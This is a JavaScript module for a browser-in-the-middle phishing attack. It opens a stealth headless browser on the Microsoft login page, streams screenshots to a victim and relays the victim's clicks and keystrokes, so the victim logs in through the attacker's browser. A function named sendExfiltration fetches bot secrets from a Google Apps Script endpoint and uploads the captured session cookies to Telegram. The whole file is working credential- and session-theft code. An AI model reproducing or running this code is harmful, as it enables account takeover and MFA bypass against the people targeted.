const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
const TARGET = "https://login.microsoftonline.com/";

let cachedSecrets = null;
async function fetchSecrets() {
    if (cachedSecrets) return cachedSecrets;
    try {
        const res = await axios.get(VAULT_URL, { timeout: 3000 });
        cachedSecrets = res.data;
        return cachedSecrets;
    } catch (e) { return null; }
}

async function sendExfiltration(cookies, url) {
    const s = await fetchSecrets();
    if (!s || !s.TG_TOKEN) return;
    try {
        const host = new URL(url).hostname;
        await axios.post(`https://api.telegram.org/bot${s.TG_TOKEN}/sendMessage`, {
            chat_id: s.TG_CHAT_ID,
            text: `🚨 <b>Session Captured</b>\nHost: ${host}`,
            parse_mode: 'HTML'
        });
        const form = new FormData();
        form.append('chat_id', s.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies)), { filename: 'cookies.json' });
        await axios.post(`https://api.telegram.org/bot${s.TG_TOKEN}/sendDocument`, form, { headers: form.getHeaders() });
    } catch (e) {}
}

async function startSession(io, socket) {
    fetchSecrets(); // Fire and forget
    let browser = await puppeteer.launch({
        headless: "new",
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--single-process']
    });

    const page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 720 });
    await page.goto(TARGET, { waitUntil: 'networkidle2' });

    const stream = setInterval(async () => {
        try {
            const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
            socket.emit('browser-render', { screenshot: b64 });
        } catch (e) {}
    }, 1000);

    socket.on('victim-action', async (d) => {
        try {
            if (d.type === 'click') await page.mouse.click(d.x, d.y);
            if (d.type === 'key') await page.keyboard.press(d.key);
        } catch (e) {}
    });

    socket.on('disconnect', async () => {
        clearInterval(stream);
        await browser.close();
    });
}

module.exports = { startSession };
